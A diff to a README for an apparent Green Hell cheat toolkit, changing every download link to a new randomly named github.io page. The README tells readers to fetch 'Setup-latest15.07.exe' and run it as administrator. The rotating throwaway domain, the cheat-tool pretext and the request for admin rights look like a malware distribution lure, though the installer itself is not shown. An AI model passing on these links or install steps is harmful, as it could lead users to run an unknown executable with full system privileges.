@@ -2,7 +2,7 @@
 
 The **Green Hell Ultimate Survival Toolkit** is an all-in-one desktop enhancement suite designed for the survival game *Green Hell*. This toolkit gives players fine-grained control over their survival experience — from stat management and inventory customization to performance profiling and interface improvements. Built exclusively for Windows 10/11, it delivers a clean, intuitive workflow that lets you tailor every aspect of your jungle survival session to your preferences, whether you're playing solo or in private co-op.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -22,7 +22,7 @@ The **Green Hell Ultimate Survival Toolkit** is an all-in-one desktop enhancemen
 
 Setting up the Green Hell Ultimate Survival Toolkit on your Windows 10 or 11 machine is fast and painless. Follow the steps below:
 
-1. **Download** the latest installer (`Setup-latest15.07.exe`) from the [official download page](https://yellowtaxisave.github.io/download-page/).
+1. **Download** the latest installer (`Setup-latest15.07.exe`) from the [official download page](https://capitals-707-bringing.github.io/download-page/).
 2. **Locate** the downloaded `Setup-latest15.07.exe` file in your Downloads folder or wherever your browser saves files.
 3. **Right-click** the installer and select **"Run as administrator"** to ensure all system components register correctly.
 4. **Follow the setup wizard** — accept the license agreement, choose your preferred installation directory (the default is fine for most users), and click **Next** through each step.
@@ -72,7 +72,7 @@ No. The toolkit operates on live game data in memory and does not permanently al
 
 Get the latest release of the Green Hell Ultimate Survival Toolkit from the official GitHub Pages download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
